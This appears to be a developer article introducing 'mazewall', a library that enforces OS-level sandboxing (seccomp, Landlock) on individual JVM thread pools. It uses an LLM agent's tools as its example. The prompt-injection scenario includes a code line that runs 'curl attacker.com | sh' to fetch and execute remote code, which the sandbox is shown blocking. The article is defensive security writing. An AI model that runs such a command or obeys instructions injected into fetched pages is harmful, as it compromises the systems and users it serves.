# Your Threads Are All Equally Trusted — Should They Be?

> **What this is:** A developer-first introduction to mazewall—how to enforce OS-level sandboxing constraints directly on your JVM thread pools.
>
> After reading this, you will understand what thread-level OS sandboxing is, why your service likely lacks it today, and what it looks like to add it.

---

## The default you've never questioned

In 2021, Log4Shell didn't just exploit a logging framework. It exposed a fundamental architectural flaw in the JVM: the moment an attacker achieves remote code execution on any thread, they gain the keys to your entire process. 

Picture a typical backend service. It handles three kinds of work:

- **HTTP handlers** — parse user input, query a database, return JSON
- **PDF generators** — read font files from disk, render documents
- **Email senders** — connect to an SMTP server, fire and forget

In most services, these share a single thread pool—Spring's default task executor, a common `ForkJoinPool`, or whatever the framework hands out. The separation exists in your source code. But underneath, everything runs on the same shared pool.

From the Linux kernel's perspective, every thread in your JVM process is identical. The PDF generator thread, if compromised through a dependency vulnerability, has the exact same permission to open outbound network sockets as your email sender. Your HTTP handler thread can spawn a reverse shell just as easily.

The architectural walls in your code exist logically. They do not exist physically.

---

## What "enforced" actually means

There are two ways to constrain what code can do:

**Software-level constraints** — your code simply doesn't call certain APIs. You trust that `PdfGeneratorService` won't open a socket because you wrote it that way. This is the default everywhere, and it is fine until a dependency is compromised, a library has a critical bug, or an attacker achieves code execution inside your JVM.

**Kernel-level constraints** — the OS itself refuses to carry out the operation. It doesn't matter what code is running or how it got there. The system call is intercepted before it reaches the kernel, and `EPERM` is returned. Full stop.

mazewall is about the second kind, applied directly to your thread pools, from inside your application, without external infrastructure.

---

## A concrete scenario: the AI agent

To see why this matters, consider a modern use case: an LLM-based agent orchestrating three tools:

- **`fetchWebpage`** — makes outbound HTTP requests
- **`analyzeUserFile`** — reads files from a workspace directory
- **`executeDataAnalysis`** — runs shell scripts

Each tool runs in its own contained executor:

```kotlin
// Web tool: can make network calls, cannot spawn processes
val webExecutor = ContainedExecutors.wrap(
    webRawExecutor,
    Policy.builder().allowNetworkConnect().denyExec().build()
)

// File tool: can ONLY read from the workspace directory (Landlock enforcement)
val fileExecutor = ContainedExecutors.wrap(
    fileRawExecutor,
    Policy.builder().allowFsRead(workspaceDir.absolutePath).build()
)

// Analysis tool: CAN spawn processes, but only when executing data analysis tasks
val analysisExecutor = ContainedExecutors.wrap(analysisRawExecutor, execPolicy)
```

Now consider what happens during a prompt injection attack—where malicious content in a fetched webpage tries to hijack the agent into running a shell command:

```kotlin
// Inside fetchWebpage(), a malicious instruction embedded in the page tries:
val process = ProcessBuilder("sh", "-c", "curl attacker.com | sh").start()
```

Because this runs on a thread in the `webExecutor`, and that thread has subprocess execution blocked at the OS level, the `ProcessBuilder` call throws an `IOException` immediately. The attack stops. The file executor cannot exfiltrate data over the network because `connect` is blocked on its threads.

No external firewall rules. No container reconfiguration. The policy is declared next to the code that needs it.

---

## Two levels of enforcement

mazewall works in two tiers that stack together.

### Tier 1: Process-wide baseline

This applies a rule to your entire JVM process—every thread, library, and future class loaded. You call it once at startup:

```kotlin
// Called once at application startup, before accepting any traffic.
// After this line, no thread in this JVM can ever spawn a child process (execve is blocked).
ContainedExecutors.installOnProcess(Policy.NO_EXEC)
```

**When to use it:** For invariants that should be universally true. A typical API service has no legitimate reason to spawn shell commands. Blocking `execve` process-wide costs nothing at runtime, and it turns the most common post-exploitation payload (spawn a reverse shell) into a dead end—regardless of which thread is compromised.

### Tier 2: Thread-scoped profiles

This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM (like GC, class loading, or unrestricted pools) run normally.

```kotlin
// This executor's threads can only do pure computation. No network, no disk writes, no subprocesses.
val pdfPool = ContainedExecutors.wrap(
    Executors.newFixedThreadPool(4),
    Policy.PURE_COMPUTE
)
```

Policies are installed on each thread the first time it executes a task—zero startup overhead for idle threads. For a complete multi-pool setup (network, filesystem, and exec policies), see **Part 3**.

---

## What changes in your development workflow

Adopting thread-scoped policies means splitting generic shared thread pools into dedicated, specialized pools: one for HTTP handling, one for document generation, one for outbound calls, and so on.

This is a genuine architectural change, not just a one-liner. It has a minor runtime cost: more thread pools mean more OS threads and context switches. For I/O-heavy workloads this is usually negligible; for highly CPU-bound workloads at scale, it is worth measuring.

Once separated, wrapping is simple:

**Before:**
```kotlin
val documentPool = Executors.newFixedThreadPool(8)
```

**After:**
```kotlin
val documentPool = ContainedExecutors.wrap(
    Executors.newFixedThreadPool(8),
    Policy.PURE_COMPUTE
)
```

The `ExecutorService` interface is unchanged—`submit()`, `invokeAll()`, and `Future` work exactly as before. If you over-restrict and block something a thread legitimately needs, you will see an `IOException` or `SecurityException` during testing.

*Tip: You don't need to guess system calls—mazewall includes an automated profiler that discovers the required syscalls and filesystem paths during your test suite runs. Details in Part 2.*

*Note: Virtual thread and Kotlin coroutine support, as well as carrier thread pinning behaviour, are covered in [Part 3](article3-enforcement.md) and the [README](../../README.md).*

---

## How to use it correctly: Threat Model & Boundaries

Thread-scoped sandboxing alone is **not** an absolute security boundary against an attacker with Arbitrary Code Execution (ACE) on the sandboxed thread. Because all JVM threads share the exact same address space and heap, a native memory corruption exploit (e.g., via buffer overflow or unsafe pointer manipulation) on a contained thread could corrupt memory on unrestricted sibling or helper threads to achieve an escape.

This is why the two tiers are designed to stack:

1. **Tier 1 (process-wide)** establishes the absolute backstop—things no thread in your application should ever do (like spawning subprocesses). This remains meaningful even against memory corruption exploits.
2. **Tier 2 (thread-scoped)** dramatically reduces the blast radius—limiting what a compromised thread can do before an attacker can attempt sophisticated heap escalation.

In most real-world post-exploitation scenarios (such as Log4Shell, XXE, SSRF), the attacker never gets the chance to attempt memory-level escalation.

---

> [!NOTE]
> **What mazewall is not:** It is one layer in a security stack, not a replacement for container security (Docker/Podman Seccomp profiles, cgroups, network policies), cluster-wide eBPF observability tools, or standard concerns like authentication and input validation. Those outer layers are still necessary. The difference is that cluster-wide tools see the JVM as a single black box and Docker applies one profile to every thread uniformly. mazewall lets you express different rules for different parts of the same JVM process—enforced by the same kernel mechanisms (Seccomp-BPF and Landlock LSM)—from inside the application, with no external agent required.

---

## Try it in your project

**Requirements:** Linux kernel ≥ 5.13, JDK 22+, no root or special capabilities required.

Add the dependency to your build (see [GETTING_STARTED.md](../../GETTING_STARTED.md) for GitHub Packages configuration details).

Then initialize a process-wide baseline in your application launcher:

```kotlin
fun main() {
    ContainedExecutors.installOnProcess(Policy.NO_EXEC)
    // Run your application...
}
```

---

## Where to go next

**[Part 1: Do You Really Know What Your App Is Doing at Runtime? →](article.md)**
The case for behavioral security: why knowing what a library *is* is not the same as knowing what it *does* at runtime.
